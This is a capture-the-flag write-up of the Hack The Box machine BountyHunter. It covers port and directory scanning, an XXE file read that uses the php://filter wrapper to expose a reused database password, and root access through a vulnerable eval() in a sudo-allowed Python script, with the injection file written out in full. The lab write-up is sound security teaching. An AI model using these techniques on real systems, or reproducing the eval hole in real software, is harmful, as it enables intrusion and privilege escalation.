---
title:     "Hack The Box - Bountyhunter"
tags: [linux,easy,xxe,sudo,python]
categories: HackTheBox
---
[![info_card](/img/bountyhunter/info_card.png)](/img/bountyhunter/info_card.png)

BountyHunter is an easy rated machine on HackTheBox created by [ejedev](https://www.hackthebox.eu/home/users/profile/280547).  For the user part we will abuse a XXE vulnerability in a `Bounty Report System` to read the source of the website containing credentials for ssh access. Once on the machine we are able to run a python script as root which passes some of our input to an eval statement, thus allowing for arbitratry code execution as the root user.

# User
## Nmap

As always we begin our enumeration on the machine with a nmap scan against all ports, followed by the script and version detection scan for the open ones to gain an initial picture of the attack surface.

`All ports scan`
```
$ sudo nmap -T4 -p- 10.129.180.12
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-26 13:29 BST
Nmap scan report for 10.129.180.12
Host is up (0.028s latency).
Not shown: 65532 closed ports
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    open     http

Nmap done: 1 IP address (1 host up) scanned in 589.70 seconds
```

`Script and version scan`
```
$ sudo nmap -p22,80 -sC -sV 10.129.180.12
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-26 13:39 BST
Nmap scan report for 10.129.180.12
Host is up (0.028s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)
|   256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)
|_  256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Bounty Hunters
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.88 seconds
```

## XXE

Only two ports are open, with http being the more likely succesfull entry, so we will start there. Browsing to it we see a `Bounty Hunters`  home page.

[![home](/img/bountyhunter/home.png)](/img/bountyhunter/home.png)

Going over to portal it states that this part is under development and we can test the bountry tracker. Applications being under development are always quite interesting due to a higher chance of flaws in their code.

[![portal_moved](/img/bountyhunter/portal_moved.png)](/img/bountyhunter/portal_moved.png)

In the bountry tracker we can add values for `Exploit Title`, `CWE`, `CVSS Score` and `Bounty Reward ($)`.

[![bounty](/img/bountyhunter/bounty.png)](/img/bountyhunter/bounty.png)

Intercepting the request and looking at it in Burp repeater we see it is base64 encoded data, however the `X-Requested-With` already gives away what it is decoded.

[![b64](/img/bountyhunter/b64.png)](/img/bountyhunter/b64.png)

Decoding it indeed reveals the data in XML structure.

[![decoded_xml](/img/bountyhunter/decoded_xml.png)](/img/bountyhunter/decoded_xml.png)

Testing for basic forms of XXE we add our own DTD with an entity consisting of the `/etc/passwd` file. Since the output of our XML request mirrors the input, it should display the `passwd` file if we replace a field with the earlier defined entity.

[![xxe_prep](/img/bountyhunter/xxe_prep.png)](/img/bountyhunter/xxe_prep.png)

Base64 and URL-encoding the data again we can see that it is indeed vulnerable after sending the request. This also reveals the user account `development`. All we might need now is either a password or an ssh key.

[![working_poc](/img/bountyhunter/working_poc.png)](/img/bountyhunter/working_poc.png)

Since we can read local files with the XXE we have to figure out which ones we want to read. The user does not seem to have a private ssh key, but another interesting thing to take a look at is the source code of the web app. To discover most of the pages we can run a gobuster scan against it with the `php` extension.

```
$ gobuster dir -w /opt/SecLists/Discovery/Web-Content/raft-large-words.txt -u http://10.129.180.12/ -x php
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.180.12/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /opt/SecLists/Discovery/Web-Content/raft-large-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2021/07/26 13:40:08 Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 278]
/.html                (Status: 403) [Size: 278]
/.html.php            (Status: 403) [Size: 278]
/js                   (Status: 301) [Size: 311] [--> http://10.129.180.12/js/]
/index.php            (Status: 200) [Size: 25169]
/css                  (Status: 301) [Size: 312] [--> http://10.129.180.12/css/]
/.htm                 (Status: 403) [Size: 278]
/.htm.php             (Status: 403) [Size: 278]
/assets               (Status: 301) [Size: 315] [--> http://10.129.180.12/assets/]
/db.php               (Status: 200) [Size: 0]
/resources            (Status: 301) [Size: 318] [--> http://10.129.180.12/resources/]
/.                    (Status: 200) [Size: 25169]
/portal.php           (Status: 200) [Size: 125]
```

The `db.php` looks interesting but since php code get's executed and not displayed we cannot use the `file://` wrapper to include it. There exists however a wrapper that is commonly used in LFI scenarios to circumvent this problem. With `php://filter/convert.base64-encode/resource` we can base64 encode the source code so it does not get run by the server on including it.

[![db_unencoded](/img/bountyhunter/db_unencoded.png)](/img/bountyhunter/db_unencoded.png)

[![db_encoded](/img/bountyhunter/db_encoded.png)](/img/bountyhunter/db_encoded.png)

Decoding it again the source reveals the password for the database access.

```
$ echo PD9waHAKLy8gVE9ETyAtPiBJbXBsZW1lbnQgbG9naW4gc3lzdGVtIHdpdGggdGhlIGRhdGFiYXNlLgokZGJzZXJ2ZXIgPSAibG9jYWxob3N0IjsKJGRibmFtZSA9ICJib3VudHkiOwokZGJ1c2VybmFtZSA9ICJhZG1pbiI7CiRkYnBhc3N3b3JkID0gIm0xOVJvQVUwaFA0MUExc1RzcTZLIjsKJHRlc3R1c2VyID0gInRlc3QiOwo/Pgo= | base64 -d
<?php
// TODO -> Implement login system with the database.
$dbserver = "localhost";
$dbname = "bounty";
$dbusername = "admin";
$dbpassword = "m19RoAU0hP41A1sTsq6K";
$testuser = "test";
?>
```

This password is also reused for the development account which gives us ssh access to the machine and we can grab the user flag.

```
$ ssh development@10.129.180.12
The authenticity of host '10.129.180.12 (10.129.180.12)' can't be established.
ECDSA key fingerprint is SHA256:3IaCMSdNq0Q9iu+vTawqvIf84OO0+RYNnsDxDBZI04Y.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.180.12' (ECDSA) to the list of known hosts.
development@10.129.180.12's password:
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon 26 Jul 2021 12:47:00 PM UTC

  System load:           0.0
  Usage of /:            23.4% of 6.83GB
  Memory usage:          13%
  Swap usage:            0%
  Processes:             216
  Users logged in:       0
  IPv4 address for eth0: 10.129.180.12
  IPv6 address for eth0: dead:beef::250:56ff:feb9:5a2c


0 updates can be applied immediately.


Last login: Wed Jul 21 12:04:13 2021 from 10.10.14.8
development@bountyhunter:~$ wc -c user.txt
33 user.txt
```

# Root

Looking at sudo permission we can see that development can run `/opt/skytrain_inc/ticketValidator.py` with python3.8 as root.

```
development@bountyhunter:~$ sudo -l
Matching Defaults entries for development on bountyhunter:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User development may run the following commands on bountyhunter:
    (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
	
```

This script takes a filepath, opens the file at this location, performs some checks on it and eventually passes a piece of it to the eval function. The interesting part in this python script is the portion where eval get's called. So we need to create a file that passes the check up to this point and place some code at the correct place for it to get evaled.

`/opt/skytrain_inc/ticketValidator.py`
```py
#Skytrain Inc Ticket Validation System 0.1
#Do not distribute this file.

def load_file(loc):
    if loc.endswith(".md"):
        return open(loc, 'r')
    else:
        print("Wrong file type.")
        exit()

def evaluate(ticketFile):
    #Evaluates a ticket to check for ireggularities.
    code_line = None
    for i,x in enumerate(ticketFile.readlines()):
        if i == 0:
            if not x.startswith("# Skytrain Inc"):
                return False
            continue
        if i == 1:
            if not x.startswith("## Ticket to "):
                return False
            print(f"Destination: {' '.join(x.strip().split(' ')[3:])}")
            continue

        if x.startswith("__Ticket Code:__"):
            code_line = i+1
            continue

        if code_line and i == code_line:
            if not x.startswith("**"):
                return False
            ticketCode = x.replace("**", "").split("+")[0]
            if int(ticketCode) % 7 == 4:
                validationNumber = eval(x.replace("**", ""))
                if validationNumber > 100:
                    return True
                else:
                    return False
    return False

def main():
    fileName = input("Please enter the path to the ticket file.\n")
    ticket = load_file(fileName)
    #DEBUG print(ticket)
    result = evaluate(ticket)
    if (result):
        print("Valid ticket.")
    else:
        print("Invalid ticket.")
    ticket.close

main()
```

First the script calls `load_file` which is defined earlier. All this does is check if the file ends with `.md` and exits if it doesn't. Next `evalute` is called which has multiple checks in it. Basically it goes through it line by line and has a new check for each line. After going through the code we can break down how our file needs to look.
-	First line starts with `# Skytrain Inc`
-	Second line starts with `## Ticket to` and needs another space followed by something arbitratry.
-	Third line starts with `__Ticket Code:__`
-	Fourth line has to start with `**` there also has to be a `+` in it, where the part before it get's parsed by `int()` to a number that results in 4 if taken mod 7. The rest of this line needs to be that code which we want to get evaluated.

A possible way to achive root from here is to just import os with the `__import__()` function and then call bash with `system`.

`root.md`
```
development@bountyhunter:~$ cat root.md
# Skytrain Inc
## Ticket to what
__Ticket Code:__
**4+__import__('os').system("/bin/bash")
```

With everything prepared, running the script with sudo and specifying our file, we dropp into a root shell and are able to read the flag.

```
development@bountyhunter:~$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
Please enter the path to the ticket file.
/home/development/root.md
Destination: what
root@bountyhunter:/home/development# id
uid=0(root) gid=0(root) groups=0(root)
root@bountyhunter:/home/development# wc -c /root/root.txt
33 /root/root.txt
```